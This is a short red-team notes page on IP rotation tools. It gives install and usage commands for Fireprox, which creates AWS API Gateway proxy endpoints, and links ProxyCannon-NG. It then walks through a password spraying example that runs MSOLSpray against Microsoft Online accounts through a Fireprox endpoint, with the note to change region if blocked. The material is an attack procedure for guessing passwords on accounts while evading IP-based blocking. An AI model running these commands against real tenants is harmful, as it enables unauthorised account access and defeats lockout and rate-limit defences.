# IP rotation Tools

## Fireprox

Note: change the region if you get blocked

### Install

```csharp
git clone https://github.com/ustayready/fireprox
cd fireprox virtualenv -p python3 . 
source bin/activate 
pip install -r requirements.txt 
```

### Usage

* Create the remote endpoint

```csharp
python fire.py --access_key <AWS_KEY> --secret_access_key <AWS_SECRET> --region <REGION> --url <TARGET SITE> --command create
```

### Destroy 

* Once finished, delete the endpoint

```csharp
python fire.py --access_key <access_key_id> --secret_access_key <secret_access_key> --region --a
pi_id <API ID>  --command destroy
```

### Password Spraying example

* Create an endpoint using fireprox

![](../../.gitbook/assets/image%20%2881%29.png)

* Create an user list

![](../../.gitbook/assets/image%20%28295%29.png)

* Load MSOLSpray module and execute it using the userlist, a password and the proxy url :

```text
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password WrongPass123 -URL https://llm9mzll40.execute-api.eu-west-1.amazonaws.com/fireprox/
```

![](../../.gitbook/assets/image%20%28308%29.png)

* cleanup ****

```csharp
python fire.py --access_key $AWS --secret_access_key $KEY --region eu-west-1 --api_id  llm9mzll40 --command destroy
```

### resources

{% embed url="https://github.com/ustayready/fireprox" %}

## ProxyCannon-NG

{% embed url="https://github.com/proxycannon/proxycannon-ng" %}

